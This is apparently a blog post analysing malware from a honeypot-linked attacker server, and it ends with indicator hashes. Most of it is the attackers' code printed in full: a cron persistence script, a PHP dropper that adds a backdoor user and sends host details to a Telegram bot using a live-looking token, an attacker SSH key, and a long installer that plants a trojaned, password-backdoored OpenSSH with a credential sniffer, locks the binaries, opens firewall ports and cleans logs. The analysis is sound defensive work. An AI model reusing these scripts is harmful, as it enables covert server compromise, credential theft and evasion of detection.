### The story
I was looking at my honey pot logs using the following command.<br>
<br>
`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.session.file_download")) | .url' | grep -v "null" | sort | uniq -c | sort -bgr | head -n 10`<br>


The command scrapes the log files and displays the top 10 URLS that were used to download files. 

Usually the top 10 contains IP's not domains. The last result caught my eye because it contained the domain name: http://chairfiller[.]org/smtp.

The first thing I did was use  the tool, Dirseach on the domain. This tool uses a list of popular file names and will check to see
if the file exists. 

<img src="https://i.imgur.com/aq4XhPX.png" alt="chairfiller[.]org dirsearch" width="200" height="250">


The Figure above shows the files and directories that were found by the tool. 
<ul>
  <li>/authorized_keys</li>
  <li>/a</li>
  <li>/echo</li>
  <li>/f</li>
  <li>/archive.zip</li>
  <li>/perl</li>
  <li>/phptest.php</li>
  <li>/setup</li>
  <li>/test</li>
</ul>  

The list above shows some of the more intresting files.<br><br><br>
<img src="https://i.imgur.com/cZDgh63.png" alt="chairfiller[.]org/a" width="175" height="200"><br>
The Figure above shows that when you visit `chairfiller[.]org/a` the visitor is shown the file system where there is a hidden directory named .b. 

<img src="https://i.imgur.com/gMnIksc.png" alt="chairfiller[.]org/a/.b" width="175" height="200">
<br>
The Figure above shows the contents of the `chairfiller[.]org/a/.b/` directory. The contents of the directory contains files for windows and linux based operating systems. 

One of the files in the directory is a file named autorun. 

```bash
#!/bin/sh
pwd > dir
dir=$(cat dir)
echo "* * * * * $dir/update >/dev/null 2>&1" > cron
crontab cron
crontab -l | grep update
echo "#!/bin/sh
if test -r $dir/pid; then
pid=\$(cat $dir/pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > update
chmod u+x update

```
The Figure above shows the contents of the file located at `http://chairfiller.org/a/.b/autorun`.

The autorun Figure shown above is a Bash script. The first thing the script does create a new that will contain the machine's home directory file path. This file is named dir. Next the script creates a variable named dir. Whe $dir is called the script will use the cat command to read the contents of the dir file. After that variable is created the script will use the echo command to create a new cron job that will use the $dir variable created earlier to get the machines home path. The next line is where the script will add the cron to the crontab. 

The script use the the command `crontab -l` to list the machines cronjob.The script will also use the `grep` command to look for cronjobs that contain the string "update".



### echo
The script, echo can be found at `http://chairfiller[.]org/echo`. The scrip in written in PHP and uses the Telegram API to send data to the attackers. 
```php
<?php exec('useradd mails; echo "mails:badguys" | chpasswd; sudo adduser mails udo'); $sys = php_uname(); $lihat = system('curl ipecho.net/plain'); $corenya =system('nproc');$response = file_get_contents("https://api.telegram.org/bot165187481:AAFwnMlabSDcSfMe474hAEZht9sHdrCip2Y/sendMessage?chat_id=-463422282&text=Sfu vine : -> IP : ".$lihat." -> Core : ".$corenya." -> User : mails -> Pass : bdguys -> Uname : ".$sys); ?>
```
<br>
The snippet above shows the contents of echo. The first thing the PHP script does is add a new user named `mails` to the system. Next it uses echo to add the password `badguys` to the password file. The script uses the `chpasswd` command to change the password. The last thing it does to the user mails is give it sudo permissions. But I think they forget  the s on the sudo. 

Next the PHP code creates a variable named `$sys`. The variable uses PHP's `php_name()` method to return information about the system. The `lihat` variable uses PHP's system method to use curl to visit `ipecho.net/plain` which will return the IP address of the server. The next variable run the `nproc` command which will return the number of processing units that the system contains. 

The next part of the script contains the part where the attacker uses Telegram to send inforamtion about the infected computer to a certain Telegram channel.  

### Authorized_keys
```txt
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAm4OL3t9/CKCXnaS1FqMqVBZtIctaDGfNTwkBypjk7LskJYRJn+y+dykldCNGmtRuNBCsBpzVIvY69ap4AX2h02FBhhngnOZl/P7so4JNo0EBVdeb8tps7fJryXFvbSFv5J+9OlbXa35aKQFPE1G4rQ7KM9cnUXnRtsZz/TPRwx7HRBPlM0FajN48djc2yQaHPtzustZ4YC6NMuadaZZlRMf5+HF6lpdHdsMmLuSlYBigRc1yI9OSlpFSQMxpqyCTiiPO8jOuoARu8ZT5cWzWcjce1oJ7t8IlklCPMnwtjFLdNCQsthXQU86s+5iey0Yons4WC5RW/zaDKStdGvq0qw== rsa-key-20141006
```
<br>

The snippet above shows the hacker's authorized_keys file. Once a machine is infected malware creators will often drop the authorized_keys file on the machine so they can SSH into the machine to re infect the victim. The file allows the hackers to SSH into the machine any time they want. This is dangerous.


### Setup
```bash
#!/bin/bash

# So far so good. Although I do need to add some freeBSD auto-dependency installer support but so few people even use that one it would be a waste to do so.
# ext @undernet 2015.

# The colours:

RED="\e[1;31m"
GRN="\e[1;32m"
YELLOW="\e[1;33m"
CYAN="\e[1;36m"
WHITE="\e[1;37m"
RS="\e[0m"

# Generates a 14 character password:

function genPass () {
	chars=( 'q' 'w' 'e' 'r' 't' 'y' 'u' 'i' 'o' 'p' 'a' 's' 'd' 'f' 'g' 'h' 'j' 'k' 'l' 'z' 'x' 'c' 'v' 'b' 'n' 'm' 'Q' 'W' 
		'E' 'R' 'T' 'Y' 'U' 'I' 'O' 'P' 'A' 'S' 'D' 'F' 'G' 'H' 'J' 'K' 'L' 'Z' 'X' 'C' 'V' 'B' 'N' 'M' '0' '1' '2' '3' '4'
		 '5' '6' '7' '8' '9' '.' '_' )
	for i in `seq 1 14` 
		do
			rand=$(($RANDOM%64))
			echo -n "${chars[$rand]}"
		done
	echo 
}

# Searches the system for hidden things >:)

function sniff () {

	if [ "$1" == "exhaustive" ]
	then
		if [ -z "$2" ]
		then
			directory="/usr/include"
			echo -e "${GRN}[+] Performing exhaustive search in $directory and all subdirectories for older sniffer logs.${RS}"
			find $directory -type f -exec grep "+password:" {} \; 2> /dev/null >> huntlog.txt
			cat huntlog.txt
			echo
			echo -e "${GRN}[+] Exhaustive search has been completed. You can review these logs (if any) by reading 'huntlog.txt'.${RS}"
			sleep 2
		else
			directory=$2
			echo -e "${GRN}[+] Performing exhaustive search in $directory and all subdirectories for older sniffer logs.${RS}"
			find $directory -type f -exec grep "+password:" {} \; 2> /dev/null >> huntlog.txt
			cat huntlog.txt
			echo
			echo -e "${GRN}[+] Exhaustive search has been completed. You can review these logs (if any) by reading 'huntlog.txt'.${RS}"
			sleep 2
		fi
	fi

	if [ "$1" == "quick" ]
	then
		if [ -z "$2" ]
		then
			directory="/usr/include"
			echo -e "${GRN}[+] Performing quick search ONLY in the files from $directory and not any other subdirectories.${WHITE}"
			echo
			for i in  "$directory"/*
				do
					grep -H "+password:" $i 2> /dev/null >> huntlog.txt
				done
			cat huntlog.txt
			echo
			echo -e "${GRN}[+] Quick search has been completed. You can review these logs (if any) by reading 'huntlog.txt'.${RS}"
			sleep 2
		else
			directory=$2
			echo -e "${GRN}[+] Performing quick search ONLY in the files from $directory and not any other subdirectories.${RS}"
			echo
			for i in  "$directory"/*
				do
					grep -H "+password:" $i 2> /dev/null >> huntlog.txt
				done
			cat huntlog.txt
			echo
			echo -e "${GRN}[+] Quick search has been completed. You can review these logs (if any) by reading 'huntlog.txt'.${RS}\n"
			sleep 2
		fi
	fi
}

function snifferSearch () {

	echo -ne "${YELLOW}[!] Do you want to perform a sniffer logfile search on the device: ${CYAN}(Y/N) ${input0} ${RS}"
	read input0

	if [ "$input0" == "Y" ] || [ "$input0" == "y" ]
		then
		echo -ne "${YELLOW}[!] Type '1' for an 'exhaustive' sniff or '2' for a 'quick' one: ${CYAN}${input1} ${RS}"
		read input1

		if [ "$input1" == "1" ]
			then
			echo -ne "${YELLOW}[!] Choose a directory: (default: /usr/include) ${CYAN}${input2} ${RS}"
			read input2
			if [ "$input2" != "" ]
				then
				sniff exhaustive $input2
			else
				sniff exhaustive
			fi
		fi

		if [ "$input1" == "2" ]
			then
			echo -ne "${YELLOW}[!] Choose a directory: (default: /usr/include) ${CYAN}${input2}${RS}"
			read input2
			if [ "$input2" != "" ]
				then
				sniff quick $input2
			else
				sniff quick
			fi
		fi
	else
		echo -e "${GRN}[+] Moving on. ${RS}"
	fi
}

# Starts up the sshd.

function sshdStart () {

	mv /usr/sbin/sshd sshd_old 
	cp sshd /usr/sbin/sshd
	echo -e "${GRN}[+] Modified sshd.${RS}"
	cat sshd_config > /etc/ssh/sshd_config
	echo -e "${GRN}[+] Sorted sshd_config.${RS}"

	mv /usr/bin/ssh ssh_old 
	cp ssh /usr/bin/ssh
	echo -e "${GRN}[+] Modified ssh.${RS}"
	cat ssh_config > /etc/ssh/ssh_config
	echo -e "${GRN}[+] Sorted ssh_config.${RS}"

	chattr +iau /usr/sbin/sshd
	echo -e "${GRN}[+] Changed attributes for sshd to +iau.${RS}"
	chattr +iau /usr/bin/ssh
	echo -e "${GRN}[+] Changed attributes for ssh to +iau.${RS}"

	if [[ -f /var/run/sshd.pid ]] 
		then
		kill -9 `cat /var/run/sshd.pid`
		/usr/sbin/sshd
	fi

	if [[ -f /var/run/sshd.init.pid ]] 
		then
		kill -9 `cat /var/run/sshd.init.pid`
		/usr/sbin/sshd
	fi

	if [[ -f /var/run/sshd2_22.pid ]] 
		then
		kill -9 `cat /var/run/sshd2_22.pid`
		/usr/sbin/sshd
	fi

	service ssh stop 2> /dev/null >> /dev/null
	service ssh start 2> /dev/null >> /dev/null
	service sshd stop 2> /dev/null >> /dev/null
	service sshd start 2> /dev/null >> /dev/null
}

# Auto installs gcc:

function autoGCC () {

	if [ -f /usr/bin/yum ]
		then
			echo -e "${YELLOW}[!] Attempting to auto-install using yum...${RS}"
			yum install -y gcc >> /dev/null
	fi

	if	 [ -f /usr/bin/apt-get ]
		then
			apt-get update >> /dev/null
			echo -e "${GRN}[+] Updated apt-get repositories.${RS}"
			echo -e "${YELLOW}[!] Attempting to auto-install gcc using apt-get...${RS}"
			apt-get install gcc -y >> /dev/null
	fi

	if [ -f /sbin/yast ]
		then
		echo -e "${YELLOW}[!] Attempting to auto-install gcc using yast...${RS}"
		yast -i gcc >> /dev/null
	fi

	if [ -f /usr/bin/zypper ]
		then
		echo -e "${YELLOW}[!] Attempting to auto-install gcc using zypper...${RS}"
		chmod +x /usr/bin/zypper
		zypper -n install gcc >> /dev/null
	fi

	if 	[ -f /usr/bin/gcc ] 
		then
		echo
		echo -e "${GRN}[+] gcc installed. ${RS}"
	else
		echo
		echo -e "${RED}[-] gcc could not be auto installed. ${RS}"
	fi
}

# Auto installs g++:

function autoG++ () {

	if [ -f /usr/bin/yum ]
		then
		echo -e "${YELLOW}[!] Attempting to auto-install g++ using yum.${RS}"
   		yum install gcc-c++ compat-gcc-34 compat-gcc-34-c++ -y >> /dev/null
	fi

	if [ -f /usr/bin/apt-get ]
		then
   		apt-get update >> /dev/null
   		echo -e "${GRN}[+] Updated apt-get repositories.${RS}"
   		echo -e "${YELLOW}[!] Attempting to auto-install g++ using apt-get...${RS}"
   		apt-get install g++ -y >> /dev/null
	fi

	if [ -f /usr/include/stdio.h ] 
		then
		echo -e "${GRN}[+] g++ sucessfully installed. ${RS}"
	else
		echo -e "${RED}[-] g++ could not be auto installed. ${RS}"
	fi
}

# Auto installs make:

function autoMake () {

	if [ -f /usr/bin/yum ]
		then
		echo -e "${YELLOW}[!] Attempting to auto-install make using yum...${RS}"
   		yum install -y make >> /dev/null
	fi

	if [ -f /usr/bin/apt-get ]
		then
   		apt-get update >> /dev/null
   		echo -e "${GRN}[+] Updated apt-get repositories.${RS}"
   		echo -e "${YELLOW}[!] Attempting to auto-install make using apt-get...${RS}"
   		apt-get install make -y >> /dev/null
	fi

	if [ -f /sbin/yast ]
		then
		echo -e "${GRN}[+] Found yast on the system.${RS}"
		echo -e "${YELLOW}[!] Attempting to auto-install make using yast...${RS}"
		yast -i make >> /dev/null
	fi

	if [ -f /usr/bin/zypper ]
		then
		echo -e "${GRN}[+] Found zypper on the system.${RS}"
		echo -e "${YELLOW}[!] Attempting to auto-install make using zypper...${RS}"
   		zypper -n install make >> /dev/null
	fi

	if [ -f /usr/bin/make ] 
		then
		echo -e "${GRN}[+] make sucessfully installed. ${RS}"
	else
		echo -e "${RED}[-] make could not be auto installed. ${RS}"
	fi
}

# Auto installs openssl-devel:

function autoOpenssl () {

	if [ -f /usr/bin/yum ]
		then
		echo -e "${YELLOW}[!] Attempting to auto-install openssl using yum...${RS}"
   		yum install -y openssl-devel >> /dev/null
	fi

	if [ -f /usr/bin/apt-get ]
		then
		echo -e "${YELLOW}[!] Updating apt-get.. please wait!${RS}"
   		apt-get update >> /dev/null
   		echo -e "${GRN}[+] Updated apt-get repositories.${RS}"
   		echo -e "${YELLOW}[!] Attempting to auto-install openssl using apt-get...${RS}"
   		apt-get install openssl libssl-dev -y >> /dev/null
	fi

	if [ -f /sbin/yast ]
		then
		echo -e "${GRN}[+] Found yast on the system.${RS}"
		echo -e "${YELLOW}[!] Attempting to auto-install openssl using yast...${RS}"
   		yast -i openssl-devel >> /dev/null
	fi

	if [ -f /usr/bin/zypper ]
		then
		echo -e "${GRN}[+] Found zypper on the system.${RS}"
		echo -e "${YELLOW}[!] Attempting to auto-install openssl using zypper...${RS}"
   		zypper -n install openssl-devel >> /dev/null
	fi

	if [ -d /usr/include/openssl ] 
		then
		echo -e "${GRN}[+] openssl sucessfully installed. ${RS}"
	else
		echo -e "${RED}[-] openssl could not be auto installed. ${RS}"
	fi
}

# Auto installs zlib:

function autoZlib () {
	echo -e "${YELLOW}[!] Attempting to auto-install zlib...${RS}"

	if [ ! -f "/usr/bin/gcc" ] || [ ! -f "/usr/bin/make" ]
    	then
    	echo -e "${RED}[-] zlib can not be installed at this time because of unmet dependencies..${RS}"
    	echo -e "${RED}[-] exit. "
    	exit
	fi

    if [ -f /usr/bin/wget ]
       	then
       	wget http://freefr.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz 2> linkerr.txt >> /dev/null
        echo -e "${GRN}[+] downloaded zlib. ${RS}"
        tar zxvf zlib-1.2.8.tar.gz >> /dev/null
	    echo -e "${GRN}[+] decompressed zlib archive. ${RS}"
	    zlib-1.2.8/configure >> /dev/null
	    echo -e "${GRN}[+] configured zlib. ${RS}"
	    zlib-1.2.8/make >> /dev/null
	    echo -e "${GRN}[+] ran make. ${RS}"
	    zlib-1.2.8/make install >> /dev/null
	    echo -e "${GRN}[+] installed zlib. ${RS}"
	    ln -s /usr/local/include/zlib.h /usr/include/zlib.h >> /dev/null
	    ln -s /usr/local/share/man/man3/zlib.3 /usr/share/man/man3/zlib.3 >> /dev/null
	    echo -e "${GRN}[+] link complete. ${RS}"
	fi	

	if [ -f /usr/bin/curl ]
	    then
	    curl -O -s http://freefr.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz 2> linkerr.txt >> /dev/null
	    echo -e "${GRN}[+] downloaded zlib. ${RS}"
	    tar zxvf zlib-1.2.8.tar.gz >> /dev/null
	    echo -e "${GRN}[+] decompressed zlib archive. ${RS}"
	    zlib-1.2.8/configure >> /dev/null
	    echo -e "${GRN}[+] configured zlib. ${RS}"
	    zlib-1.2.8/make >> /dev/null
	    echo -e "${GRN}[+] ran make. ${RS}"
	    zlib-1.2.8/make install >> /dev/null
	    echo -e "${GRN}[+] installed zlib. ${RS}"
	    ln -s /usr/local/include/zlib.h /usr/include/zlib.h >> /dev/null
	    ln -s /usr/local/share/man/man3/zlib.3 /usr/share/man/man3/zlib.3 >> /dev/null
	    echo -e "${GRN}[+] link complete. ${RS}"
	fi	

	if [ f /usr/bin/fetch ]
	    then
	    fetch http://freefr.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz 2> linkerr.txt >> /dev/null
	    echo -e "${GRN}[+] fetched zlib. ${RS}"
	    tar xzvf zlib-1.2.8.tar.gz 2> /dev/null >> /dev/null
	    echo -e "${GRN}[+] decompressed zlib archive. ${RS}"
	    zlib-1.2.8/configure 2> /dev/null >> /dev/null
	    echo -e "${GRN}[+] configured zlib. ${RS}"
	    zlib-1.2.8/make 2> /dev/null >> /dev/null
	    echo -e "${GRN}[+] ran make. ${RS}"
	    zlib-1.2.8/make install 2> /dev/null >> /dev/null
	    echo -e "${GRN}[+] installed zlib. ${RS}"
	    ln -s /usr/local/include/zlib.h /usr/include/zlib.h 2> /dev/null >> /dev/null
	    ln -s /usr/local/share/man/man3/zlib.3 /usr/share/man/man3/zlib.3 2> /dev/null >> /dev/null
	    echo -e "${GRN}[+] link complete. ${RS}"
    fi

	if [ -f /usr/include/zlib.h ] 
    	then
    	echo -e "${GRN}[+] done.${RS}"
    else
    	echo -e "${RED}[-] zlib could not be auto installed.${RS}"
    	echo
    	cat linkerr.txt
	fi
}

# Start:

echo
echo -e "${YELLOW}[!] Initiating...${RS}"
chmod +x *
sleep 1

snifferSearch

echo -e "${YELLOW}[!] Checking for dependencies."

if [[ "`whoami`" == "root"  ]] 
	then
	echo -e "${GRN}[+] uid0 ok."
else
	echo -e "${RED}[-] uid0 not found."
	exit
fi 

if [ -f /usr/bin/gcc ]
	then
	echo -e "${GRN}[+] gcc ok. ${RS}"
else
	echo -e "${RED}[-] gcc not found. ${RS}"
	autoGCC
fi

if [ -f /usr/include/stdio.h ]
	then
	echo -e "${GRN}[+] g++ ok. ${RS}"
else
	echo -e "${RED}[-] g++ not found. ${RS}"
	autoG++
fi

if [ -f /usr/bin/make ]
	then
	echo -e "${GRN}[+] make ok. ${RS}"
else
	echo -e "${RED}[-] make not found. ${RS}"
	autoMake
fi

if [ -d /usr/include/openssl ]
	then
	echo -e "${GRN}[+] openssl-dev ok. ${RS}"
else
	echo -e "${RED}[-] openssl-dev not found. ${RS}"
	autoOpenssl
fi

if [ -f /usr/include/zlib.h ]
	then
	echo -e "${GRN}[+] zlib ok. ${RS}"
else
	echo -e "${RED}[-] zlib not found. ${RS}"
	autoZlib
fi

if [ ! -f "/usr/bin/gcc" ]
	then
	echo -e "${RED}[-] Missing gcc. ${RS}"
	echo -ne "${YELLOW}[!] Continue ?${CYAN}(Y/N)${RS} - ${WHITE}${INPUT}${RS} -"
	read INPUT
	if [ "$INPUT" != "Y" ] && [ "$INPUT" != "y" ]
		then
		echo
		echo -e "${RED}[-] Exiting.${RS}"
		echo -e "${YELLOW}[!] Try to install it manually!${RS}"
		echo
		exit
    fi
fi

if [ ! -f "/usr/bin/make" ]
	then
	echo -e "${RED}[-] Missing make. ${RS}"
	echo -ne "${YELLOW}[!] Continue ?${CYAN}(Y/N)${RS} - ${WHITE}${INPUT}${RS} -"
	read INPUT
	if [ "$INPUT" != "Y" ] && [ "$INPUT" != "y" ]
		then
		echo
		echo -e "${RED}[-] Exiting.${RS}"
		echo -e "${YELLOW}[!] Try to install it manually!${RS}"
		echo
		exit
    fi
fi

if [ ! -d "/usr/include/openssl" ]
	then
	echo -e "\n\n${YELLOW}[!] Missing openssl."
	echo -ne "${YELLOW}[!] Continue ?${CYAN}(Y/N)${RS} - ${WHITE}${INPUT}${RS} -"
	read INPUT
	if [ "$INPUT" != "Y" ] && [ "$INPUT" != "y" ]
		then
		echo
		echo -e "${RED}[-] Exiting.${RS}"
		echo -e "${YELLOW}[!] Try to install it manually!${RS}"
		echo
		exit
    fi
fi

if [ ! -f "/usr/include/zlib.h" ]
	then
	echo -e "\n\n${YELLOW}[!] Missing zlib."
	echo -ne "${YELLOW}[!] Continue ?${CYAN}(Y/N)${RS} - ${WHITE}${INPUT}${RS} -"
	read INPUT
	if [ "$INPUT" != "Y" ] && [ "$INPUT" != "y" ]
		then
		echo
		echo -e "${RED}[-] Exiting.${RS}"
		echo -e "${YELLOW}[!] Try to install it manually!${RS}"
		echo
		exit
    fi
fi

if [ ! -f "/usr/include/stdio.h" ]
	then
	echo -e "\n\n${YELLOW}[!] Missing g++."
	echo -ne "${YELLOW}[!] Continue ?${CYAN}(Y/N)${RS} - ${WHITE}${INPUT}${RS} -"
	read INPUT
	if [ "$INPUT" != "Y" ] && [ "$INPUT" != "y" ]
		then
		echo
		echo -e "${RED}[-] Exiting.${RS}"
		echo -e "${YELLOW}[!] Try to install it manually!${RS}"
		echo
		exit
    fi
fi

echo -e "${YELLOW}[!] Backing up & changing permissions...${RS}"
mkdir sshbackup 2> /dev/null >> /dev/null 
cp -r /etc/ssh sshbackup/.etc.ssh 2> /dev/null >> /dev/null 
echo -e "${GRN}[+] Made backup of /etc/ssh in .etc.ssh.${RS}"
chattr -iau /usr/bin/ssh 2> /dev/null
echo -e "${GRN}[+] Changed attributes of /usr/bin/ssh to -iau.${RS}"
chattr -iau /usr/sbin/sshd 2> /dev/null
echo -e "${GRN}[+] Changed attributes of /usr/sbin/sshd to -iau.${RS}"
cat /etc/ssh/sshd_config > sshd_config
echo -e "${GRN}[+] Copied sshd_config.${RS}"
cat /etc/ssh/ssh_config > ssh_config
echo -e "${GRN}[+] Copied ssh_config.${RS}"

BPASS="$(genPass)"

echo -ne "${YELLOW}[!] Backdoor password - auto-generated ( ${CYAN}${BPASS} ${YELLOW}):${CYAN} "
read BPASS1
if [ "$BPASS1" != "" ]
	then
	BPASS=$BPASS1
fi

echo -e "${GRN}[+] The password is: ${CYAN}${BPASS}${RS}"
echo -ne "${YELLOW}[!] Sniffer logging path - default ( ${CYAN}/usr/libs/ame.lb ${YELLOW}):${CYAN} "
read LPATH


if [ "$LPATH" == "" ] 
	then
	LPATH="/usr/libs/ame.lb"
fi

echo -e "${GRN}[+] Logging path set to: ${CYAN}${LPATH}${RS}"

cat backdoor.h |sed -e s/SSHD_PASS/"$BPASS"/ -e s#LOG_PATH#"$LPATH"# > 1.temp
mv 1.temp backdoor.h

SSHV=`ssh -V 2>&1 |sed s/,/\ /| awk '{print $1}'`
echo -ne "${YELLOW}[!] SSH_VERSION is set to${RS} ${CYAN}${SSHV}${YELLOW}. Do you want to change it? ${CYAN} " 
read SSHV1
if [[ "$SSHV1" != "" ]]
	then 
	SSHV=$SSHV1
fi
echo -e "${GRN}[+] Set SSH_VERSION to: ${CYAN}${SSHV}${RS}" 
echo '#define SSH_VERSION    "'$SSHV'"'>> version.h

echo -e "${YELLOW}[!] Backing up files... ${RS}"
cat /etc/ssh/sshd_config > sshd_config
cat /etc/ssh/ssh_config > ssh_config
echo -e "${GRN}[+] Files backed up. ${RS}"
echo -e "${YELLOW}[!] Installing sniffer... this will take a while.${RS}"
./configure --sysconfdir=/etc/ssh 2> conf_stderr_log >> /dev/null
echo -e "${YELLOW}[!] 50% Complete.${RS} "
make 2> make_stderr_log >> /dev/null

if [[ ! -f ssh || ! -f sshd ]]
	then
	echo -e "${RED}[-] Something went wrong while making/configuring - tailing logs:${RS}"
	sleep 1
	echo
	tail -n 10 conf_stderr_log
	echo
	echo -e "${RED}===================================================================================${RS}"
	echo
	sleep 1
	tail -n 10 make_stderr_log
	echo 
else
	if [[ -d tools ]]
		then
		echo -e "${YELLOW}[!] Cleaning system logs for root entries. ${RS}"
		cd tools 2> /dev/null >> /dev/null
		make linux 2> /dev/null >> /dev/null
		logcleaner -u root 2> /dev/null >> /dev/null
		cd ..
	fi
	echo -e "${YELLOW}[!] Restarting sshd. ${RS}"
	sshdStart
	echo -ne "${YELLOW}[!] What SSH port shall we test for (default 22): ${CYAN}${RS}" 
	read port
	localhost='127.0.0.1'

	if [ "$port" == "" ]
		then
		port="22"
	fi

	if nc -zv -w10 $localhost $port <<< . &> /dev/null
		then
		echo -e "${GRN}[+] Port $port up and running.${RS}"
		echo -e "${GRN}[+] OpenSSH patched for: ${WHITE}`uname -n`.${RS}"
		echo -e "${CYAN}[+] `/sbin/ifconfig |grep inet |grep -v "127\.0\.0\.1" |tr ":" " " |awk '{print $3}' |head -n 1` root:${CYAN}${BPASS}${YELLOW} ---> $LPATH${RS}"
		echo "[+] `/sbin/ifconfig |grep inet |grep -v "127\.0\.0\.1" |tr ":" " " |awk '{print $3}' |head -n 1` root:$BPASS + $LPATH" >> /usr/lib/libssh.ssh
		echo -ne "${RS}"
	else
		echo -e "${RED}[-] Port $port is closed.${RS}"
		echo -e "${YELLOW}[!] Attempting to autofix by generating RSA and opening ports... ${RS}"
		sleep 1
		echo y | ssh-keygen -t rsa -f /etc/ssh/ssh_host_key -N "" >> /dev/null
		echo -e "${GRN}[+] Generated RSA key.${RS}"
		sleep 1
		chattr -iau /var/empty 2> /dev/null >> /dev/null
		rm -rf /var/empty 2> /dev/null >> /dev/null
		mkdir /var/empty 2> /dev/null >> /dev/null
		chown -R root /var/empty 2> /dev/null >> /dev/null
		chmod go-w /var/empty 2> /dev/null >> /dev/null
		echo -e "${GRN}[+] Chowned root to /var/empty.${RS}"
		/sbin/iptables -I INPUT -d 0/0 -s 0/0 -p tcp --dport $port -j ACCEPT
		echo -e "${GRN}[+] Opened $port in iptables - inbound.${RS}"
		/sbin/iptables -I OUTPUT -d 0/0 -s 0/0 -p tcp --dport $port -j ACCEPT
		echo -e "${GRN}[+] Opened $port in iptables - outbound.${RS}"
		sleep 1
		chattr -iau /etc/ssh/sshd_config 2> /dev/null >> /dev/null
		chattr -iau /etc/ssh/sshd_config 2> /dev/null >> /dev/null
		rm -rf /etc/ssh/sshd_config /etc/ssh/ssh_config 2> /dev/null >> /dev/null
		mv backupssh /etc/ssh/ssh_config 2> /dev/null >> /dev/null
		mv backupsshd /etc/ssh/sshd_config 2> /dev/null >> /dev/null
		/usr/sbin/sshd 2> /dev/null >> /dev/null
		service sshd restart 2> /dev/null >> /dev/null
		service ssh restart 2> /dev/null >> /dev/null
		echo -e "${GRN}[+] OpenSSH patched for: ${WHITE}`uname -n`.${RS}."
		echo -e "${CYAN}[+] `/sbin/ifconfig |grep inet |grep -v "127\.0\.0\.1" |tr ":" " " |awk '{print $3}' |head -n 1` root:${CYAN}${BPASS}${YELLOW} ---> $LPATH${RS}"
		echo "[+] `/sbin/ifconfig|grep inet|grep -v "127\.0\.0\.1"|tr ":" " "|awk '{print $3}'|head -n 1` root:$BPASS + $LPATH" >> /usr/lib/libssh.ssh
		echo
		echo -e "${GRN}[+] Done. ${RS}"
		exit
	fi
fi
```
<br>

The Bash script above does a lot of stuff. It is able to install g++, gcc, make, openssl, zlib. The script is able to look in directories for passwords. The script is also able to scan directories looking for these log files. The script will save all the passwords in a file named `huntlog.txt`

### Perl
<img src="https://i.imgur.com/ijB3Brc.png" alt="chairfiller[.]org/perl" width="708" height="402"><br>

The image above show some of the contents of the perl file that was found at `chairfiller[.]org/perl`. 
The perl file is a IRC bot that allows the attacker to control the machine by sending commands through a IRC server. The server IP that is used to host the IRC chat is `164.90.240.68`. The port of the IRC server is port 81. 

The Perl script has many different features. The Perl script is able to scan the infected machines local network for open ports. The IRC bot also appears to be able to perform different types of DDOS attacks. The script also contains features that would allow the attackers to send spam emails.
<br>



### IOC
<ul>
  <li>e4eda70e5c4daccdffb71ff79e4877bd57f81f80  echo</li>
  <li>a8ab84485735cec4e44c2f6db03d6f57c8533b4c  archive.zip</li>
  <li>24d99819577424c9b7eda952017988d119683c95  perl</li>
  <li>e417ab727cf42a1dcc180bb03fb05e1ecdcdb523  authorized_keys</li>
  <li>31794942f3fd3ce51ac2505ea7825e56f8848a70  setup</li>
  <li>b45ae5d8d3069ee7f880dd461c931fa711b6ad3d  f</li>
</ul>
